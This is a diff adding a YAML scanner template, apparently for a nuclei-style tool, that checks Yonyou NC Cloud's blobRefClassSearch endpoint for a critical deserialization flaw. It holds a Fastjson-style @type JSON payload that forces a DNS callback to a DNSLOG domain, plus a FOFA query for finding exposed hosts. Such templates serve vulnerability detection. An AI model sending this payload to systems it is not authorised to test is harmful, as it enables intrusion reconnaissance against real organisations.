@@ -1,0 +1,20 @@
+id: yonyou-nc-cloud-blobrefclasssea-unserialize
+info:
+  name: 用友 NC Cloud blobRefClassSea 反序列化漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 文件上传
+  finger: 用友-NC-Cloud
+  fofa: app="用友-NC-Cloud"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /ncchr/pm/ref/indiIssued/blobRefClassSearch
+  headers:
+    Content-Type: application/json
+  data: '{"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"{{.domain}}\"}}}"}'
+  expression: reverse.Verify()
+transport: http
